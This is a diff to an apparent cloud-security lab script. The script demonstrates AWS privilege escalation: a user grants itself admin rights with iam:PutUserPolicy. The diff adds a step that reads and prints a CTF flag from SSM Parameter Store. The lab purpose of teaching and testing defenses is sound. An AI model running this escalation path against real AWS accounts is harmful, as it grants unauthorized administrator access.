@@ -171,16 +171,31 @@ aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"
 
 echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
 
+# [EXPLOIT] Step 6: Capture the CTF flag
+use_starting_creds
+echo -e "${YELLOW}Step 6: Capturing the CTF flag${NC}"
+show_attack_cmd "Attacker" "aws ssm get-parameter --name /pathfinding-labs/flags/iam-007-to-admin --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name /pathfinding-labs/flags/iam-007-to-admin --query 'Parameter.Value' --output text)
+if [ -z "$FLAG_VALUE" ]; then
+    echo -e "${RED}Error: Could not retrieve CTF flag — check that the scenario is deployed and policy has propagated${NC}"
+    exit 1
+fi
+echo -e "${GREEN}✓ Flag captured: $FLAG_VALUE${NC}\n"
+
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 # Summary
 echo -e "${GREEN}========================================${NC}"
-echo -e "${GREEN}Attack Summary${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
 echo -e "Attack: Used ${YELLOW}iam:PutUserPolicy${NC} to attach inline admin policy to self"
 echo -e "Result: ${GREEN}Administrator Access${NC}"
+echo -e "Flag: ${GREEN}$FLAG_VALUE${NC}"
 echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER → (PutUserPolicy on self) → Admin"
+echo -e "  $STARTING_USER → (PutUserPolicy on self) → Admin → (ssm:GetParameter) → CTF Flag"
 echo ""
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
@@ -193,9 +208,6 @@ fi
 
 echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to remove the inline policy${NC}"
 echo ""
-
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Mark demo as active for plabs tracking
 touch "$(dirname "$0")/.demo_active"
